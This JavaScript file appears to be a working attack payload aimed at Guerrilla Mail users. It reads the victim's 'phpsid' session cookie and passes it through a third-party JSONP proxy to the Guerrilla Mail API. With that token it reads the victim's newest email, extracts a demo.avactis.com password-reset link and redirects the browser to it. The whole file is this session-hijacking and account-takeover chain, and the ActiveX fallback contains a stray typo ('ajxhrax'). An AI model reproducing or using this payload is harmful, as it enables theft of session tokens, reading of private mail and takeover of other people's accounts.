//Crossbrowser function to download file using ajax
//Credit to Chris Baker @ Stack Overflow: https://stackoverflow.com/a/18361648
//Licensed under CC BY-SA (https://creativecommons.org/licenses/by-sa/2.0/) as according to the Stack Overflow ToS (https://stackexchange.com/legal/terms-of-service)
var ajaxGet = function (url, callback) {
    var callback = (typeof callback == 'function' ? callback : false), xhr = null;
    try {
      xhr = new XMLHttpRequest();
    } catch (e) {
      try {
        ajxhrax = new ActiveXObject("Msxml2.XMLHTTP");
      } catch (e) {
        xhr = new ActiveXObject("Microsoft.XMLHTTP");
      }
    }
    if (!xhr)
           return null;
    xhr.open("GET", url,true);
    xhr.onreadystatechange=function() {
      if (xhr.readyState==4 && callback) {
        callback(xhr.responseText)
      }
    }
    xhr.send(null);
    return xhr;
}

//Returns value of cookie
//Credit to Quirksmode.org (http://www.quirksmode.org/js/cookies.html)
//Copyright http://www.quirksmode.org/about/copyright.html
function readCookie(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) {
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}

//Get list of emails sent to the email from guerrillamail api via sonp.afeld.me proxy to remove limitations due to lacking Cross-Site Request Forgery token
ajaxGet(
    'https://jsonp.afeld.me/?url=http%3A%2F%2Fapi.guerrillamail.com%2Fajax.php%3Ff%3Dget_email_list%26ip%3D127.0.0.1%26agent%3DMozilla_foo_bar%26sid_token%3D' + readCookie('phpsid') + '%26offset%3D0',
    function (response) {
        response = JSON.parse(response);
        if (!response)
            return;

        //Download the newest email
        ajaxGet(
            'https://jsonp.afeld.me/?url=http%3A%2F%2Fapi.guerrillamail.com%2Fajax.php%3Ff%3Dfetch_email%26ip%3D127.0.0.1%26agent%3DMozilla_foo_bar%26sid_token%3D' + readCookie('phpsid') + '%26email_id%3D' + response.list[0].mail_id,
            function (response) {
                response = JSON.parse(response);
                if (!response)
                    return;

                //Get the demo.avactis.com url from that email and redirect to that site
                var url = response.mail_body.match(/http:\/\/demo\.avactis\.com\/4\.7\.9\/new-password\.php\?key=([a-zA-z0-9]){10,}/g)[0];
                window.location = url;
        });
});
